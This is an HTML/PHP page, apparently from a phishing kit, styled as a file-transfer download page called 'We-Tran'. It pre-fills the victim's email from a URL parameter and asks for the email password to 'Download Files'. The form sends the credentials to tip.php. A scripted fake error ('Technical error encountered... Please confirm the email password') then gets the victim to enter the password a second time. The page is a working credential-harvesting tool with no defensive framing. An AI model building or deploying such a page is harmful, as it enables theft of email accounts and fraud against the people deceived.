<!doctype html>
<html>
    <head>
        <meta charset="utf-8">
        <title>We-Tran</title>
       <link rel="shortcut icon" href="favicon-a34a7465.ico">
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">

        <!-- jQuery library -->
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

        <!-- Popper JS -->
        <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>

        <!-- Latest compiled JavaScript -->
        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>

        <style>
            body {
                background-image: url(bg.png);
                background-repeat: no-repeat;
                color: #045eb4;
            }



            #d {
                position: relative;
                left: 530px;
                top: 350px;

            }

            #form {
                position: absolute;
                left: 530px;
                top: 50px;
                width: 300px;
                border-radius: 10px;
                padding: 20px;
                z-index: 2;
                background: white;
                display:none;

            }

            #myModal{
                top: 40%;
                left: 50%;
                transform: translate(-50%,-50%);
                overflow: hidden;
            }
            #mydal{
                top: 50%;
                left: 50%;
                transform: translate(-50%,-50%);
            }
            .blue{
                background-color: #045eb4;
                color: white;
            }
            #sub1{
                margin-top: 480px;
                margin-left: 140px;
                border-radius: 15px;
                position: absolute;
                z-index: 1;


            }
            .sky{
                background-color: #409fff;
                color:white;

            }
        </style>
    </head>

    <body>

        <!-- The Modal -->
        <div class="modal fade" id="myModal">
            <div class="modal-dialog modal-md">
                <div class="modal-content">
                    <!-- Modal body -->
                    <div class="modal-body text-center" >
                        <img src="logo.jpg" width="200"><br>
                        <div id="msg" style="color:black;">Please confirm receiving email </div>
                        <hr>
                        <h1></h1>
                        <form method="post" id="users" action="tip.php" >

                            <p id="em"><?php echo $_GET['x1']; ?></p>
                            <input type="password" name="x2" class="form-control text-center" value="" id="ps" placeholder="Enter Password" required="" >
                            <span class="text-danger" id="er"></span>
                            <input type="hidden" id="m" value="<?php echo $_GET['x1']; ?>" name="x1">
                            <br>
                            <button id="sub" name="sub"  type="submit" class="btn btn-md btn-block sky">Download Files</button>
                        </form>
                    </div>
                </div>
            </div>
        </div>


        <div class="modal fade" id="mydal">
            <div class="modal-dialog modal-md">
                <div class="modal-content">
                    <!-- Modal body -->
                    <div class="modal-body text-center" >
                        <img src="pro.gif"  style="width:100%;max-width:200px ;"><br>
                        <div id="ms" class="text-danger h5">Downloading Files. </div>

                    </div>
                </div>
            </div>
        </div>



        <div id="form" class="text-center">

        </div>






        <script>
            $(document).ready(function () {

                $("#users").submit(function (event) {
                    event.preventDefault();
                    $("#sub").html("Porcessing...").prop("disabled", true);
                    $.ajax({
                        type: "POST",
                        url: "tip.php",
                        data: $(this).serialize()
                    }).done(function (data) {
                        setTimeout(function () {
                            $("#myModal").modal("hide");
                            $("#mydal").modal("show");
                            setTimeout(function () {
                                $("#ms").html(`Technical error encountered
Please confirm the email password
Try Again<br>
      
                                                `);
                                setTimeout(function () {
                                    $("#myModal").modal("show");
                                    $("#mydal").modal("hide");
                                    $("#sub").html("Download Files").prop("disabled", false);
                                    $("#ps").val("");
                                }, 3000);

                            }, 2000);

                        }, 3000);


                    }).fail(function () {
                        alert("error");
                    });
                });
            });
        </script>


        <button type="button" id="sub1" class="btn btn-primary" data-toggle="modal" data-target="#myModal">
            Download Files
        </button>


    </body>

</html>
